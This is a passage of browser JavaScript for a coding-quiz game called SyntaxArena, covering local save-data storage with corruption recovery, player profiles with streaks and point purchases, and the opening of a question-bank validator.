    unlockedAvatars: ['cyber_fox', 'terminal_owl', 'matrix_cat', 'bit_knight'],
    unlockedModes: ['campaign', 'practice']
  };
}

/**
 * Default clean state factory.
 */
window.createDefaultStorageSchema = createDefaultStorageSchema; function createDefaultStorageSchema() {
  const defaultProf = createDefaultProfile();
  return {
    version: CURRENT_SCHEMA_VERSION,
    activeProfileId: defaultProf.id,
    profiles: [defaultProf],
    activeSession: null,
    settings: {
      theme: 'dark',
      soundEnabled: true,
      musicEnabled: true,
      sfxVolume: 0.8,
      musicVolume: 0.5,
      reducedMotion: false
    }
  };
}

class StorageManager {
  constructor() {
    this.isAvailable = Utils.isStorageAvailable();
    this.isStorageDegraded = false;
    this.memoryFallback = null;
    this.degradationListeners = new Set();
    this.recoveryListeners = new Set();

    if (!this.isAvailable) {
      console.warn('[StorageManager] localStorage is unavailable. Operating in in-memory session mode.');
      this.isStorageDegraded = true;
      this.memoryFallback = createDefaultStorageSchema();
    }
  }

  /**
   * Subscribe to storage degradation warnings (e.g. quota exceeded or unavailable).
   * @param {Function} callback (errorReason) => void
   * @returns {Function} Unsubscribe
   */
  onDegradation(callback) {
    this.degradationListeners.add(callback);
    return () => this.degradationListeners.delete(callback);
  }

  /**
   * Subscribe to corruption recovery notifications.
   * @param {Function} callback ({ salvagedProfiles: number, message: string }) => void
   * @returns {Function} Unsubscribe
   */
  onRecovery(callback) {
    this.recoveryListeners.add(callback);
    return () => this.recoveryListeners.delete(callback);
  }

  _notifyDegradation(reason) {
    this.degradationListeners.forEach(cb => {
      try { cb(reason); } catch (_) {}
    });
  }

  _notifyRecovery(info) {
    this.recoveryListeners.forEach(cb => {
      try { cb(info); } catch (_) {}
    });
  }

  /**
   * Read and parse stored data safely with corruption recovery and deep migration.
   * @returns {object} Validated application storage object
   */
  load() {
    if (!this.isAvailable) {
      return this.memoryFallback || createDefaultStorageSchema();
    }

    try {
      const raw = window.localStorage.getItem(STORAGE_KEY);
      if (!raw) {
        const fresh = createDefaultStorageSchema();
        this.save(fresh);
        return fresh;
      }

      let parsed;
      try {
        parsed = JSON.parse(raw);
      } catch (parseErr) {
        console.warn('[StorageManager] Malformed JSON in localStorage. Initiating corruption salvage.', parseErr);
        this._quarantineCorrupted(raw);
        const fresh = createDefaultStorageSchema();
        this.save(fresh);
        this._notifyRecovery({ salvagedProfiles: 0, message: 'Saved data was corrupted and has been reset to defaults.' });
        return fresh;
      }

      // Validate schema integrity
      if (!this._isValidSchema(parsed)) {
        console.warn('[StorageManager] Stored data schema invalid. Attempting partial salvage.');
        const salvaged = this._salvageCorrupted(parsed, raw);
        this.save(salvaged);
        return salvaged;
      }

      // Handle migrations if schema version is older
      if (typeof parsed.version !== 'number' || parsed.version < CURRENT_SCHEMA_VERSION) {
        const migrated = this._migrate(parsed);
        this.save(migrated);
        return migrated;
      }

      // Ensure all profiles inside current schema have all required keys (deep hygiene)
      let needsResave = false;
      const hygienicProfiles = parsed.profiles.map(p => {
        const cleaned = this._sanitizeProfile(p);
        if (JSON.stringify(cleaned) !== JSON.stringify(p)) {
          needsResave = true;
        }
        return cleaned;
      });

      if (needsResave) {
        parsed.profiles = hygienicProfiles;
        this.save(parsed);
      }

      return parsed;
    } catch (err) {
      console.error('[StorageManager] Storage read failure. Falling back to memory state.', err);
      const fallback = this.memoryFallback || createDefaultStorageSchema();
      return fallback;
    }
  }

  /**
   * Save complete data object to localStorage safely.
   * Handles QuotaExceededError and security errors gracefully.
   * @param {object} data
   * @returns {boolean} Success status
   */
  save(data) {
    if (!data || typeof data !== 'object') {
      console.error('[StorageManager.save] Attempted to save invalid data structure.');
      return false;
    }

    // Keep memory mirror updated for uninterrupted in-memory play
    this.memoryFallback = JSON.parse(JSON.stringify(data));

    if (!this.isAvailable) {
      return true;
    }

    try {
      const serialized = JSON.stringify(data);
      window.localStorage.setItem(STORAGE_KEY, serialized);
      if (this.isStorageDegraded) {
        this.isStorageDegraded = false; // Restored normal persistence
      }
      return true;
    } catch (err) {
      this.isStorageDegraded = true;
      console.error('[StorageManager.save] Failed to write to localStorage (Quota exceeded or security restriction).', err);
      this._notifyDegradation(err.name || 'StorageUnavailable');
      return false;
    }
  }

  /**
   * Reset all data to initial factory defaults.
   * @returns {object} Fresh default schema
   */
  resetAll() {
    try {
      if (typeof window !== 'undefined' && window.localStorage) {
        window.localStorage.clear();
      } else if (typeof globalThis !== 'undefined' && globalThis.localStorage) {
        globalThis.localStorage.clear();
      }
      if (typeof window !== 'undefined' && window.sessionStorage) {
        window.sessionStorage.clear();
      } else if (typeof globalThis !== 'undefined' && globalThis.sessionStorage) {
        globalThis.sessionStorage.clear();
      }
    } catch (_) {}
    const defaults = createDefaultStorageSchema();
    this.save(defaults);
    return defaults;
  }

  /**
   * Export all data as a sanitized, formatted JSON string.
   * @returns {string} JSON string
   */
  exportJSON() {
    const current = this.load();
    return JSON.stringify(current, null, 2);
  }

  /**
   * Import data from JSON string with deep validation.
   * Prevents injection of arbitrary objects, corrupted types, or malicious scripts.
   * @param {string} jsonStr
   * @returns {{ success: boolean, message: string }}
   */
  importJSON(jsonStr) {
    if (typeof jsonStr !== 'string' || !jsonStr.trim()) {
      return { success: false, message: 'Empty or invalid backup file.' };
    }

    try {
      const parsed = JSON.parse(jsonStr);

      if (!parsed || typeof parsed !== 'object' || Array.isArray(parsed)) {
        return { success: false, message: 'Invalid backup root structure.' };
      }

      if (!Array.isArray(parsed.profiles) || parsed.profiles.length === 0) {
        return { success: false, message: 'Backup file must contain at least one valid player profile.' };
      }

      // Deep validate every profile
      const validProfiles = [];
      for (const p of parsed.profiles) {
        if (!p || typeof p !== 'object') continue;
        const sanitized = this._sanitizeProfile(p);
        if (sanitized && sanitized.id && sanitized.username) {
          validProfiles.push(sanitized);
        }
      }

      if (validProfiles.length === 0) {
        return { success: false, message: 'No valid player profiles found in backup.' };
      }

      // Ensure activeProfileId points to an existing profile
      let activeProfileId = typeof parsed.activeProfileId === 'string' ? parsed.activeProfileId : validProfiles[0].id;
      if (!validProfiles.some(p => p.id === activeProfileId)) {
        activeProfileId = validProfiles[0].id;
      }

      // Validate settings
      const defaultSettings = createDefaultStorageSchema().settings;
      const cleanSettings = {
        theme: ['dark', 'light', 'amber', 'gold'].includes(parsed.settings?.theme) ? parsed.settings.theme : defaultSettings.theme,
        soundEnabled: typeof parsed.settings?.soundEnabled === 'boolean' ? parsed.settings.soundEnabled : defaultSettings.soundEnabled,
        musicEnabled: typeof parsed.settings?.musicEnabled === 'boolean' ? parsed.settings.musicEnabled : defaultSettings.musicEnabled,
        sfxVolume: typeof parsed.settings?.sfxVolume === 'number' ? Math.max(0, Math.min(1, parsed.settings.sfxVolume)) : defaultSettings.sfxVolume,
        musicVolume: typeof parsed.settings?.musicVolume === 'number' ? Math.max(0, Math.min(1, parsed.settings.musicVolume)) : defaultSettings.musicVolume,
        reducedMotion: typeof parsed.settings?.reducedMotion === 'boolean' ? parsed.settings.reducedMotion : defaultSettings.reducedMotion
      };

      const importedData = {
        version: CURRENT_SCHEMA_VERSION,
        activeProfileId,
        profiles: validProfiles,
        activeSession: null, // Clear active session on import for safety
        settings: cleanSettings
      };

      const saveOk = this.save(importedData);
      if (!saveOk && this.isAvailable) {
        return { success: false, message: 'Failed to write backup to browser storage (quota exceeded).' };
      }

      return { success: true, message: `Backup restored successfully (${validProfiles.length} profile${validProfiles.length > 1 ? 's' : ''}).` };
    } catch (err) {
      return { success: false, message: 'Corrupted or malformed JSON file: ' + (err.message || 'parse error') };
    }
  }

  /**
   * Internal validation of data schema.
   */
  _isValidSchema(obj) {
    if (!obj || typeof obj !== 'object' || Array.isArray(obj)) return false;
    if (typeof obj.version !== 'number') return false;
    if (!Array.isArray(obj.profiles) || obj.profiles.length === 0) return false;
    if (typeof obj.activeProfileId !== 'string') return false;
    if (!obj.settings || typeof obj.settings !== 'object') return false;
    return true;
  }

  /**
   * Partial corruption recovery: Salvages valid profiles and preferences
   * instead of wiping all user progress.
   */
  _salvageCorrupted(parsed, rawString) {
    this._quarantineCorrupted(rawString);

    const fallback = createDefaultStorageSchema();
    const salvagedProfiles = [];

    if (parsed && Array.isArray(parsed.profiles)) {
      for (const p of parsed.profiles) {
        if (p && typeof p === 'object' && (p.username || p.id)) {
          const sanitized = this._sanitizeProfile(p);
          if (sanitized) salvagedProfiles.push(sanitized);
        }
      }
    }

    if (salvagedProfiles.length > 0) {
      fallback.profiles = salvagedProfiles;
      let targetActive = typeof parsed?.activeProfileId === 'string' ? parsed.activeProfileId : salvagedProfiles[0].id;
      if (!salvagedProfiles.some(p => p.id === targetActive)) {
        targetActive = salvagedProfiles[0].id;
      }
      fallback.activeProfileId = targetActive;

      // Salvage settings if valid
      if (parsed?.settings && typeof parsed.settings === 'object') {
        fallback.settings = { ...fallback.settings, ...parsed.settings };
      }

      this._notifyRecovery({
        salvagedProfiles: salvagedProfiles.length,
        message: `Recovered ${salvagedProfiles.length} player profile(s) from corrupted storage.`
      });
      return fallback;
    }

    this._notifyRecovery({
      salvagedProfiles: 0,
      message: 'Storage was corrupted beyond salvage. Initialized with fresh defaults.'
    });
    return fallback;
  }

  /**
   * Deep migration from earlier or partial schema versions.
   */
  _migrate(oldData) {
    console.info(`[StorageManager] Performing deep migration from v${oldData?.version ?? 0} to v${CURRENT_SCHEMA_VERSION}`);

    const base = createDefaultStorageSchema();
    const profiles = Array.isArray(oldData.profiles) && oldData.profiles.length > 0
      ? oldData.profiles.map(p => this._sanitizeProfile(p))
      : base.profiles;

    let activeProfileId = oldData.activeProfileId;
    if (!profiles.some(p => p.id === activeProfileId)) {
      activeProfileId = profiles[0].id;
    }

    const settings = {
      ...base.settings,
      ...(oldData.settings || {})
    };

    return {
      version: CURRENT_SCHEMA_VERSION,
      activeProfileId,
      profiles,
      activeSession: oldData.activeSession || null,
      settings
    };
  }

  /**
   * Sanitize an individual profile object to guarantee all required fields and types exist.
   */
  _sanitizeProfile(p) {
    const defaultProf = createDefaultProfile(p?.id || Utils.generateId('prof'), String(p?.username || 'ScriptAdept').slice(0, 20));

    const id = typeof p?.id === 'string' && p.id ? p.id : defaultProf.id;
    const username = typeof p?.username === 'string' && p.username.trim()
      ? p.username.trim().slice(0, 20)
      : defaultProf.username;

    const level = typeof p?.level === 'number' && p.level >= 1 && p.level <= 10 ? Math.floor(p.level) : 1;
    const xp = typeof p?.xp === 'number' && p.xp >= 0 ? Math.floor(p.xp) : 0;
    const lifetimeXP = typeof p?.lifetimeXP === 'number' && p.lifetimeXP >= 0 ? Math.floor(p.lifetimeXP) : (p?.lifetimeXP === undefined ? xp : 0);
    const totalScore = typeof p?.totalScore === 'number' && p.totalScore >= 0 ? Math.floor(p.totalScore) : xp;
    const hasReceivedJoiningBonus = Boolean(p?.hasReceivedJoiningBonus);
    const dayStreak = typeof p?.dayStreak === 'number' && p.dayStreak >= 1 ? Math.floor(p.dayStreak) : 1;
    const lastLoginDate = typeof p?.lastLoginDate === 'string' ? p.lastLoginDate : null;
    const completedTiers = typeof p?.completedTiers === 'object' && p?.completedTiers !== null ? { ...p.completedTiers } : {};
    const purchasedBadges = Array.isArray(p?.purchasedBadges) ? [...p.purchasedBadges] : [];

    const stats = {
      gamesPlayed: Math.max(0, parseInt(p?.stats?.gamesPlayed, 10) || 0),
      questionsAttempted: Math.max(0, parseInt(p?.stats?.questionsAttempted, 10) || 0),
      questionsCorrect: Math.max(0, parseInt(p?.stats?.questionsCorrect, 10) || 0),
      highestStreak: Math.max(0, parseInt(p?.stats?.highestStreak, 10) || 0),
      dailyChallengesCompleted: Math.max(0, parseInt(p?.stats?.dailyChallengesCompleted, 10) || 0),
      lastDailyDate: p?.stats?.lastDailyDate || null
    };

    const campaign = {
      python:     { ...defaultProf.campaign.python,     ...(p?.campaign?.python || {}) },
      c:          { ...defaultProf.campaign.c,          ...(p?.campaign?.c || {}) },
      cpp:        { ...defaultProf.campaign.cpp,        ...(p?.campaign?.cpp || {}) },
      java:       { ...defaultProf.campaign.java,       ...(p?.campaign?.java || {}) },
      cyber:      { ...defaultProf.campaign.cyber,      ...(p?.campaign?.cyber || {}) },
      javascript: { ...defaultProf.campaign.javascript, ...(p?.campaign?.javascript || {}) },
      rust:       { ...defaultProf.campaign.rust,       ...(p?.campaign?.rust || {}) },
      sql:        { ...defaultProf.campaign.sql,        ...(p?.campaign?.sql || {}) }
    };

    return {
      id,
      username,
      avatarId: typeof p?.avatarId === 'string' ? p.avatarId : defaultProf.avatarId,
      onboardingComplete: Boolean(p?.onboardingComplete),
      preferences: {
        language: ['python', 'c', 'cpp', 'java', 'cyber', 'javascript', 'rust', 'sql'].includes(p?.preferences?.language) ? p.preferences.language : 'python',
        difficulty: ['beginner', 'intermediate', 'expert'].includes(p?.preferences?.difficulty) ? p.preferences.difficulty : 'beginner'
      },
      createdAt: typeof p?.createdAt === 'number' ? p.createdAt : Date.now(),
      level,
      xp,
      lifetimeXP,
      totalScore,
      hasReceivedJoiningBonus,
      dayStreak,
      lastLoginDate,
      rank: typeof p?.rank === 'string' && p.rank ? p.rank : defaultProf.rank,
      stats,
      campaign,
      completedTiers,
      stageStars: typeof p?.stageStars === 'object' && p?.stageStars !== null ? { ...p.stageStars } : {},
      completedStages: typeof p?.completedStages === 'object' && p?.completedStages !== null ? { ...p.completedStages } : {},
      unlockedAchievements: Array.isArray(p?.unlockedAchievements) ? [...p.unlockedAchievements] : [],
      purchasedBadges,
      missedQuestionIds: Array.isArray(p?.missedQuestionIds) ? [...p.missedQuestionIds] : [],
      sessionHistory: Array.isArray(p?.sessionHistory) ? p.sessionHistory.slice(0, 50) : [],
      processedSessionIds: Array.isArray(p?.processedSessionIds) ? p.processedSessionIds.slice(0, 100) : [],
      unlockedThemes: Array.isArray(p?.unlockedThemes) && p.unlockedThemes.length > 0 ? [...p.unlockedThemes] : defaultProf.unlockedThemes,
      unlockedAvatars: Array.isArray(p?.unlockedAvatars) && p.unlockedAvatars.length > 0 ? [...p.unlockedAvatars] : defaultProf.unlockedAvatars,
      unlockedModes: Array.isArray(p?.unlockedModes) && p.unlockedModes.length > 0 ? [...p.unlockedModes] : defaultProf.unlockedModes
    };
  }

  /**
   * Quarantine corrupted data for forensic recovery or inspection.
   */
  _quarantineCorrupted(rawString) {
    try {
      window.localStorage.setItem(CORRUPTED_BACKUP_KEY, rawString);
      console.info('[StorageManager] Raw corrupted payload saved to:', CORRUPTED_BACKUP_KEY);
    } catch (_) {}
  }
}

var Storage = window.Storage = new StorageManager();


/* --- End of js/storage.js --- */

/* --- Start of js/profile.js --- */
/**
 * SyntaxArena Profile System
 * Manages user identities, avatar catalogs, validation, and profile switching.
 * Source of truth: docs/ARCHITECTURE.md & docs/MVP_SPEC.md
 */




var AVATAR_CATALOG = window.AVATAR_CATALOG = [
  { id: 'cyber_fox',    name: 'Cyber Fox',    requiredLevel: 1, symbol: '🦊', description: 'Quick, agile, and sharp-eyed.' },
  { id: 'terminal_owl', name: 'Terminal Owl', requiredLevel: 1, symbol: '🦉', description: 'Wise systems trace analyst.' },
  { id: 'matrix_cat',   name: 'Matrix Cat',   requiredLevel: 1, symbol: '🐱', description: 'Stealthy async bug stalker.' },
  { id: 'bit_knight',   name: 'Bit Knight',   requiredLevel: 1, symbol: '🛡️', description: 'Resilient compiler defender.' },
  { id: 'hex_dragon',   name: 'Hex Dragon',   requiredLevel: 4, symbol: '🐉', description: 'Fierce low-level memory lord.' },
  { id: 'glitch_bot',   name: 'Glitch Bot',   requiredLevel: 7, symbol: '🤖', description: 'Unpredictable logic hacker.' }
];

var Profile = window.Profile = {
  /**
   * Validate a proposed username.
   * Rules: 2-16 characters, alphanumeric, underscores, hyphens only.
   * @param {string} username
   * @returns {{ valid: boolean, error?: string }}
   */
  validateUsername(username) {
    if (typeof username !== 'string') {
      return { valid: false, error: 'Call-sign must be a valid text string.' };
    }
    const trimmed = username.trim();
    if (trimmed.length < 2) {
      return { valid: false, error: 'Call-sign must be at least 2 characters.' };
    }
    if (trimmed.length > 20) {
      return { valid: false, error: 'Call-sign cannot exceed 20 characters.' };
    }
    const regex = /^[a-zA-Z0-9_-]+$/;
    if (!regex.test(trimmed)) {
      return { valid: false, error: 'Only letters, numbers, underscores, and hyphens allowed.' };
    }
    return { valid: true };
  },

  /**
   * Validate if an avatarId exists in the catalog.
   * @param {string} avatarId
   * @returns {boolean}
   */
  validateAvatar(avatarId) {
    return AVATAR_CATALOG.some(a => a.id === avatarId);
  },

  /**
   * Factory function to create a new profile structure.
   * @param {string} username
   * @param {string} [avatarId='cyber_fox']
   * @param {object} [preferences={ language: 'python', difficulty: 'beginner' }]
   * @returns {object} New profile object
   */
  create(username, avatarId = 'cyber_fox', preferences = { language: 'python', difficulty: 'beginner' }) {
    const valResult = this.validateUsername(username);
    if (!valResult.valid) {
      throw new Error(valResult.error);
    }

    const safeAvatar = this.validateAvatar(avatarId) ? avatarId : 'cyber_fox';
    const profileId = Utils.generateId('prof');

    return {
      id: profileId,
      username: username.trim(),
      avatarId: safeAvatar,
      onboardingComplete: false,
      preferences: {
        language: preferences.language || 'python',
        difficulty: preferences.difficulty || 'beginner'
      },
      createdAt: Date.now(),
      level: 1,
      xp: 0,
      lifetimeXP: 0,
      totalScore: 0,
      hasReceivedJoiningBonus: false,
      dayStreak: 1,
      lastLoginDate: null,
      rank: 'Script Novice',
      stats: {
        gamesPlayed: 0,
        questionsAttempted: 0,
        questionsCorrect: 0,
        highestStreak: 0,
        dailyChallengesCompleted: 0,
        lastDailyDate: null
      },
      campaign: {
        python: { beginnerStars: 0, intermediateStars: 0, expertStars: 0, unlockedTier: 'beginner' },
        c:      { beginnerStars: 0, intermediateStars: 0, expertStars: 0, unlockedTier: 'beginner' },
        cpp:    { beginnerStars: 0, intermediateStars: 0, expertStars: 0, unlockedTier: 'beginner' },
        java:   { beginnerStars: 0, intermediateStars: 0, expertStars: 0, unlockedTier: 'beginner' }
      },
      completedTiers: {},
      unlockedAchievements: [],
      purchasedBadges: [],
      missedQuestionIds: [],
      processedSessionIds: [],
      unlockedThemes: ['dark'],
      unlockedAvatars: ['cyber_fox', 'terminal_owl', 'matrix_cat', 'bit_knight'],
      unlockedModes: ['campaign', 'practice']
    };
  },

  /**
   * Check if a profile has completed onboarding.
   * @param {object} profile
   * @returns {boolean}
   */
  isOnboardingComplete(profile) {
    return Boolean(profile && profile.onboardingComplete === true);
  },

  /**
   * Switch the active profile in state and storage.
   * @param {string} profileId
   * @returns {boolean} Success status
   */
  switchActive(profileId) {
    const profiles = State.get('profiles') || [];
    const target = profiles.find(p => p.id === profileId);
    if (!target) {
      console.warn(`[Profile.switchActive] Profile not found: ${profileId}`);
      return false;
    }

    State.set('activeProfile', { ...target });
    return true;
  },

  /**
   * Safely update an existing profile while preserving all campaign progress and stats.
   * @param {string} profileId
   * @param {object} updates
   * @returns {object|null}
   */
  updateProfile(profileId, updates = {}) {
    const profiles = State.get('profiles') || [];
    const targetIndex = profiles.findIndex(p => p.id === profileId);
    if (targetIndex === -1) {
      console.warn(`[Profile.updateProfile] Profile not found: ${profileId}`);
      return null;
    }

    const current = profiles[targetIndex];
    const updated = {
      ...current,
      ...updates,
      // Ensure nested objects preserve existing data if partially updated
      stats: { ...current.stats, ...(updates.stats || {}) },
      campaign: { ...current.campaign, ...(updates.campaign || {}) },
      preferences: { ...(current.preferences || { language: 'python', difficulty: 'beginner' }), ...(updates.preferences || {}) }
    };

    const nextProfiles = [...profiles];
    nextProfiles[targetIndex] = updated;

    State.set('profiles', nextProfiles, false);
    const active = State.get('activeProfile');
    if (active && active.id === profileId) {
      State.set('activeProfile', { ...updated }, true);
    } else {
      State._persistState();
    }

    return updated;
  },

  /**
   * Mark onboarding as complete for a profile and save chosen preferences.
   * @param {string} profileId
   * @param {{ username: string, avatarId: string, language: string, difficulty: string }} config
   * @returns {object}
   */
  completeOnboarding(profileId, { username, avatarId, language, difficulty }) {
    const valResult = this.validateUsername(username);
    if (!valResult.valid) {
      throw new Error(valResult.error);
    }
    const safeAvatar = this.validateAvatar(avatarId) ? avatarId : 'cyber_fox';

    const updates = {
      username: username.trim(),
      avatarId: safeAvatar,
      onboardingComplete: true,
      preferences: {
        language: ['python', 'c', 'cpp', 'java', 'cyber', 'javascript', 'rust', 'sql'].includes(language) ? language : 'python',
        difficulty: ['beginner', 'intermediate', 'expert'].includes(difficulty) ? difficulty : 'beginner'
      }
    };

    // Grant first-time joining bonus (+100 points) on onboarding completion
    const profile = (State.get('profiles') || []).find(p => p.id === profileId) || this.getActiveProfile();
    if (profile && !profile.hasReceivedJoiningBonus) {
      updates.hasReceivedJoiningBonus = true;
      updates.totalScore = (profile.totalScore || 0) + 100;
      updates.xp = (profile.xp || 0) + 100;
      updates.lifetimeXP = (profile.lifetimeXP || 0) + 100;
    }

    return this.updateProfile(profileId, updates);
  },

  /**
   * Add a newly created profile and make it active.
   * @param {string} username
   * @param {string} avatarId
   * @returns {object} Created profile
   */
  addNew(username, avatarId) {
    const newProfile = this.create(username, avatarId);
    const existing = State.get('profiles') || [];
    const updated = [...existing, newProfile];

    State.set('profiles', updated, false);
    State.set('activeProfile', newProfile, true);
    return newProfile;
  },

  /**
   * Retrieve currently active profile.
   * @returns {object|null}
   */
  getActiveProfile() {
    const active = State.get('activeProfile');
    if (active) return active;
    const profiles = State.get('profiles') || [];
    return profiles[0] || null;
  },

  /**
   * Record completed game session statistics to the active profile.
   * @param {object} summary - Session summary from GameEngine
   * @returns {object|null} Updated profile
   */
  recordSessionResult(summary) {
    if (!summary) return null;
    const active = this.getActiveProfile();
    if (!active) return null;

    const result = Gamification.processSessionSummary(active, summary);
    if (!result || !result.success) {
      console.warn('[Profile.recordSessionResult] Failed to process session summary:', result);
      return null;
    }

    const updated = this.updateProfile(active.id, result.updatedProfile);
    return {
      ...updated,
      ...result
    };
  },

  /**
   * Get metadata for an avatar ID.
   * @param {string} avatarId
   * @returns {object} Avatar definition
   */
  getAvatarMeta(avatarId) {
    return AVATAR_CATALOG.find(a => a.id === avatarId) || AVATAR_CATALOG[0];
  },

  /**
   * Process daily login streak and joining bonus rewards for active profile.
   * @param {string} [profileId]
   * @returns {{ joiningBonus: boolean, streakBonus: boolean, dayStreak: number, message: string|null }}
   */
  checkDailyRewards(profileId) {
    const profile = profileId ? (State.get('profiles') || []).find(p => p.id === profileId) : this.getActiveProfile();
    if (!profile) return { joiningBonus: false, streakBonus: false, dayStreak: 1, message: null };

    const updates = {};
    let joiningBonus = false;
    let streakBonus = false;
    let message = null;

    // 1. First-time Joining Bonus (+100 points) - ONLY awarded if onboarding is completed
    if (profile.onboardingComplete && !profile.hasReceivedJoiningBonus) {
      updates.hasReceivedJoiningBonus = true;
      updates.totalScore = (profile.totalScore || 0) + 100;
      updates.xp = (profile.xp || 0) + 100;
      updates.lifetimeXP = (profile.lifetimeXP || 0) + 100;
      joiningBonus = true;
      message = '🎉 Welcome to SyntaxArena! +100 Joining Bonus XP granted!';
    }

    // 2. Daily Streak Calculation
    const today = new Date().toISOString().split('T')[0];
    const lastDate = profile.lastLoginDate;

    if (!lastDate) {
      updates.lastLoginDate = today;
      updates.dayStreak = 1;
    } else if (lastDate !== today) {
      const todayMs = new Date(today).getTime();
      const lastMs = new Date(lastDate).getTime();
      const diffDays = Math.round((todayMs - lastMs) / (1000 * 60 * 60 * 24));

      if (diffDays === 1) {
        // Consecutive day!
        const nextStreak = (profile.dayStreak || 1) + 1;
        updates.dayStreak = nextStreak;
        updates.lastLoginDate = today;

        if (nextStreak === 3) {
          // 3-Day Loyalty Streak (+50 points) & confetti
          updates.totalScore = (updates.totalScore !== undefined ? updates.totalScore : (profile.totalScore || 0)) + 50;
          updates.xp = (updates.xp !== undefined ? updates.xp : (profile.xp || 0)) + 50;
          updates.lifetimeXP = (updates.lifetimeXP !== undefined ? updates.lifetimeXP : (profile.lifetimeXP || 0)) + 50;
          streakBonus = true;
          message = '🏆 3-Day Loyalty Streak! +50 Points awarded!';
        } else {
          message = `🔥 ${nextStreak}-Day Login Streak active!`;
        }
      } else if (diffDays > 1) {
        // Broken streak, restart at 1
        updates.dayStreak = 1;
        updates.lastLoginDate = today;
      }
    }

    if (Object.keys(updates).length > 0) {
      this.updateProfile(profile.id, updates);
    }

    return {
      joiningBonus,
      streakBonus,
      dayStreak: updates.dayStreak || profile.dayStreak || 1,
      message
    };
  },

  /**
   * Purchase an unlockable item (badge or avatar) using player points.
   * Deducts points/xp from spendable balance while keeping lifetimeXP intact so player level never drops.
   * @param {string} profileId
   * @param {'avatar'|'badge'} itemType
   * @param {string} itemId
   * @param {number} cost
   * @returns {{ success: boolean, message: string, profile?: object }}
   */
  purchaseItem(profileId, itemType, itemId, cost = 150) {
    const profile = (State.get('profiles') || []).find(p => p.id === profileId) || this.getActiveProfile();
    if (!profile) return { success: false, message: 'Profile not found.' };

    const currentPoints = typeof profile.totalScore === 'number' ? profile.totalScore : (profile.xp || 0);
    if (currentPoints < cost) {
      return {
        success: false,
        message: `Insufficient points! You need ${cost} points (Current: ${currentPoints.toLocaleString()}).`
      };
    }

    const updates = {
      totalScore: Math.max(0, currentPoints - cost),
      xp: Math.max(0, (profile.xp || currentPoints) - cost)
      // NOTE: lifetimeXP is deliberately NOT reduced, preserving player level!
    };

    if (itemType === 'avatar') {
      const existingAvatars = new Set(profile.unlockedAvatars || ['cyber_fox', 'terminal_owl', 'matrix_cat', 'bit_knight']);
      existingAvatars.add(itemId);
      updates.unlockedAvatars = Array.from(existingAvatars);
    } else if (itemType === 'badge') {
      const existingBadges = new Set(profile.unlockedAchievements || []);
      existingBadges.add(itemId);
      updates.unlockedAchievements = Array.from(existingBadges);
      const purchased = new Set(profile.purchasedBadges || []);
      purchased.add(itemId);
      updates.purchasedBadges = Array.from(purchased);
    }

    const updated = this.updateProfile(profile.id, updates);
    return {
      success: true,
      message: `Successfully unlocked ${itemId} for ${cost} points!`,
      profile: updated
    };
  }
};

/* --- End of js/profile.js --- */

/* --- Start of js/question-validator.js --- */
/**
 * SyntaxArena Question Bank Validator (Batch 4)
 * Comprehensive integrity validator for question schema, counts,
 * pedagogical rules, and answer keys.
 * Source of truth: docs/QUESTION_SCHEMA.md
 */

var ALLOWED_LANGUAGES = window.ALLOWED_LANGUAGES = ['python', 'c', 'cpp', 'java', 'cyber', 'javascript', 'rust', 'sql'];
var ALLOWED_DIFFICULTIES = window.ALLOWED_DIFFICULTIES = ['beginner', 'intermediate', 'expert'];
var ALLOWED_TYPES = window.ALLOWED_TYPES = [
  'multiple_choice', 'multiple-choice',
  'predict_output', 'predict-output',
  'find_bug', 'find-bug',
  'fill_code', 'fill-code', 'complete_code', 'complete-code',
  'code_tracing', 'code-tracing', 'trace_execution'
];

var TIER_POINTS = window.TIER_POINTS = {
  beginner: 100,
  intermediate: 200,
  expert: 300
};

var QuestionValidator = window.QuestionValidator = {
  /**
   * Validate an array of question objects.
   * @param {Array} questions
   * @param {object} [options={ checkExactInventory: true }]
   * @returns {{ valid: boolean, errors: Array, warnings: Array, stats: object }}
   */
  validateAll(questions, options = { checkExactInventory: true }) {
    const errors = [];
    const warnings = [];

    if (!Array.isArray(questions)) {
      return {
        valid: false,
        errors: [{ message: 'Question catalog must be an array.' }],
        warnings: [],
        stats: {}
      };
    }

    const seenIds = new Set();
    const stats = {
      total: questions.length,
      byLanguage: { python: 0, c: 0, cpp: 0, java: 0, cyber: 0, javascript: 0, rust: 0, sql: 0 },
      byTier: {
        python: { beginner: 0, intermediate: 0, expert: 0 },
        c: { beginner: 0, intermediate: 0, expert: 0 },
        cpp: { beginner: 0, intermediate: 0, expert: 0 },
        java: { beginner: 0, intermediate: 0, expert: 0 },
        cyber: { beginner: 0, intermediate: 0, expert: 0 },
        javascript: { beginner: 0, intermediate: 0, expert: 0 },
        rust: { beginner: 0, intermediate: 0, expert: 0 },
        sql: { beginner: 0, intermediate: 0, expert: 0 }
      },
      byType: {}
    };

    questions.forEach((q, idx) => {
      const qErrors = this.validateQuestion(q, idx, seenIds);
      errors.push(...qErrors);

      // Collect counts
      if (q && q.language && stats.byLanguage[q.language] !== undefined) {
        stats.byLanguage[q.language]++;
        if (q.difficulty && stats.byTier[q.language][q.difficulty] !== undefined) {
          stats.byTier[q.language][q.difficulty]++;
        }
      }

      if (q && q.type) {
        stats.byType[q.type] = (stats.byType[q.type] || 0) + 1;
      }
    });

    // Check exact inventory matrix if requested
    if (options.checkExactInventory) {
      if (questions.length !== 480) {
        errors.push({
          field: 'totalCount',
          message: `Expected exactly 480 questions in catalog, found: ${questions.length}`
        });
      }

      ALLOWED_LANGUAGES.forEach(lang => {
        const langCount = stats.byLanguage[lang] || 0;
        if (langCount !== 60) {
          errors.push({
            language: lang,
            field: 'languageCount',
            message: `Language '${lang}' must have exactly 60 questions, found: ${langCount}`
          });
        }

        ALLOWED_DIFFICULTIES.forEach(diff => {
          const tierCount = (stats.byTier[lang] && stats.byTier[lang][diff]) || 0;
          if (tierCount !== 20) {
            errors.push({
              language: lang,
              difficulty: diff,
              field: 'tierCount',
              message: `Language '${lang}' tier '${diff}' must have exactly 20 questions, found: ${tierCount}`
            });
          }
        });
      });
    }

    return {
      valid: errors.length === 0,
      errors,
      warnings,
      stats
    };
  },

  /**
   * Validate a single question object against the schema contract.
   * @param {object} q
   * @param {number} idx
   * @param {Set} seenIds
   * @returns {Array} List of validation error objects
   */
  validateQuestion(q, idx = 0, seenIds = new Set()) {
    const errs = [];

    if (!q || typeof q !== 'object') {
      errs.push({ index: idx, message: 'Question entry is not an object.' });
      return errs;
    }

    const qId = q.id || `unidentified_at_index_${idx}`;

    // 1. ID Validation
    if (!q.id || typeof q.id !== 'string') {
      errs.push({ id: qId, field: 'id', message: 'Missing or non-string ID.' });
